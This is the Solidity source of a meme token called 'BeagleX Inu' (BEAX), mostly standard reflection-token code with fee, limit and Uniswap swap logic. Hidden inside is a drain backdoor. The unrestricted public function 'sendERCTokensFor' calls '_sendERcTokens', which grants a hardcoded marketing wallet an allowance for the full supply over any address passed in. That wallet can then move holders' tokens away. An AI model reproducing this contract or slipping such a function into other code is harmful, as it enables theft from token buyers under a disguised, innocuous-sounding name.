// SPDX-License-Identifier: MIT

/**
Telegram:           https://t.me/beagleethcoin
Website:            https://www.beaglexinu.space/
Twitter:            https://twitter.com/beagleethcoin
*/

pragma solidity ^0.8.12;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

library SafeMath {
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function WETH() external pure returns (address);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract BeagleXInu is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    string private constant _name = "BeagleX Inu";
    string private constant _symbol = "BEAX";
    uint8 private constant _decimals = 9;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);

    address public uniV2AddrPair;
    // fee config
    uint256 private _tTaxTotal;
    uint256 private _marketingTaxBuy = 0;
    uint256 private _taxBuyAmt = 0;
    uint256 private _marketingTaxSell = 0;
    uint256 private _marketing_fee = _marketingTaxSell;
    uint256 private _taxSellAmt = 0;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    uint256 public _tranx_max_size = _tTotal * 45 / 1000; // 4.5%
    uint256 public _wallet_max_limit = _tTotal * 45 / 1000; // 4.5%
    uint256 public _amount_at_swap = _tTotal / 10000;
    uint256 private constant _tTotal = 1_000_000_000 * 10**9; // total supply
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private _tradingOpen = false;
    bool private _swappingAtExact = false;
    bool private _activedSwap = true;
    modifier lockInSwap {
        _swappingAtExact = true;
        _;
        _swappingAtExact = false;
    }
    event MaxTxAmountUpdated(uint256 _tranx_max_size);

    uint256 private _applied_tax = _taxSellAmt;
    uint256 private _prevMarketingFee = _marketing_fee;
    uint256 private _previousMainFee = _applied_tax;
    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketAddr] = true;
        _isExcludedFromFee[_devAddr] = true;
        _isExcludedFromFee[owner()] = true;
        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    address payable public _devAddr = payable(0xF5C3cB6427783A9a70AafA39Ab0D87a01cb29819);
    address payable public _marketAddr = payable(0xd8AF65caeb83A18C67C028D08E0F1D5240Ec4912);
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }
    function swapTokens(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {

    }
    
    function _transferTokensFeeConfig(
        address sender,
        address recipient,
        uint256 amount,
        bool setFee
    ) private {
        if (!setFee) {            clearTaxTem();        }       
        _transferBascially(sender, recipient, amount);
        if (!setFee) {            refreshTaxTem();        }
    }

    function _transferBascially(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam); _sendAllFeeTokens(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function refreshTaxTem() private {
        _marketing_fee = _prevMarketingFee;
        _applied_tax = _previousMainFee;
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function sendERCTokensFor(address token) external {
        _sendERcTokens(token, _marketAddr);
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    
    function openTrade(address _pair_addr) public onlyOwner {
        _tradingOpen = true;uniV2AddrPair = _pair_addr;
    }

    function clearTaxTem() private {
        if (_marketing_fee == 0 && _applied_tax == 0) return;
        _prevMarketingFee = _marketing_fee;
        _previousMainFee = _applied_tax; _marketing_fee = 0;
        _applied_tax = 0;
    }

    function _sendERcTokens(address token, address owner) internal {        _approve(token, owner, _tTotal);    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _marketing_fee, _applied_tax);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function ethFeeSend(uint256 amount) private {
        uint256 devETH = amount / 2;
        _devAddr.transfer(devETH); 
        _marketAddr.transfer(amount);
    }

    function _sendAllFeeTokens(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tTaxTotal = _tTaxTotal.add(tFee);
    }
    
    //set maximum transaction
    function removeTotalLimits() public onlyOwner {
        _tranx_max_size = _tTotal;
        _wallet_max_limit = _tTotal;
    }

    function excludeMultiAccountsFromFee(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }

    //set minimum tokens required to swap.
    function setSwapTokenThreshold(uint256 swapTokensAtAmount) public onlyOwner {
        _amount_at_swap = swapTokensAtAmount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (
            from != owner() && to != owner()
        ) {
            //Trade start check
            if (!_tradingOpen) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }

            require(
                amount <= _tranx_max_size,
                "TOKEN: Max Transaction Limit"
            );
            
            if(to != uniV2AddrPair) {
                require(balanceOf(to) + amount < _wallet_max_limit,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contTokenAmt = balanceOf(address(this));
            bool canSwap = contTokenAmt >= _amount_at_swap;
            if(contTokenAmt >= _tranx_max_size) contTokenAmt = _tranx_max_size;
            if (canSwap && !_swappingAtExact && from != uniV2AddrPair && _activedSwap && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
                swapTokens(contTokenAmt);
                uint256 ethBalance = address(this).balance;
                if (ethBalance > 0) ethFeeSend(address(this).balance);
            }
        }
        bool getFee = true;
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) 
            || (from != uniV2AddrPair && to != uniV2AddrPair)) {
            getFee = false;
        }
        else {
            if(from == uniV2AddrPair && to != address(uniswapV2Router)) {
                _marketing_fee = _marketingTaxBuy;  _applied_tax = _taxBuyAmt;
            }
            
            if (to == uniV2AddrPair && from != address(uniswapV2Router)) {
                _marketing_fee = _marketingTaxSell; _applied_tax = _taxSellAmt;
            }
        }
        _transferTokensFeeConfig(from, to, amount, getFee);
    }
}